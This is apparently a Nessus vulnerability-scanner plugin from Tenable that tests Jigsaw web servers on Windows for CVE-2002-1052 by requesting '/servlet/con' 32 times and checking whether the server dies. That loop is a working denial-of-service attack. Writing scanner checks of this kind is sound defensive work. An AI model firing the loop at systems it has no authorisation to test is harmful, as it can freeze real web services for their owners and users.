#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID and CAN
#


include("compat.inc");


if(description)
{
 script_id(11047);
 script_version("$Revision: 1.18 $");
 script_cve_id("CVE-2002-1052");
 script_bugtraq_id(5258);
 script_xref(name:"OSVDB", value:"4629");

 script_name(english:"Jigsaw Webserver MS/DOS Device Request Remote DoS");
 script_summary(english:"Jigsaw DOS dev DoS");
 
  script_set_attribute(
   attribute:"synopsis",
   value:"The remote web server has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of Jigsaw web server running on the remote host has a\n",
     "denial of service vulnerability.  It was possible to exhaust all of\n",
     "the web server's available threads by requesting '/servlet/con' about\n",
     "thirty times.  A remote attacker could exploit this to repeatedly\n",
     "freeze the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0031.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 script_family(english:"Web Servers");

 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "os_fingerprint.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


os = get_kb_item("Host/OS");
if ( ! os || "Windows" >!< os ) exit(0);

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);
banner = get_http_banner(port:port);
if (! banner || "Jigsaw" >!< banner ) exit(0);


url = '/servlet/con';

for (i=0; i<32;i=i+1)
{
 res = http_send_recv3(method:"GET", item:url, port:port);

 if (isnull(res))
 {
   security_warning(port);
   exit(0);
 }
}

if(http_is_dead(port:port))security_warning(port);


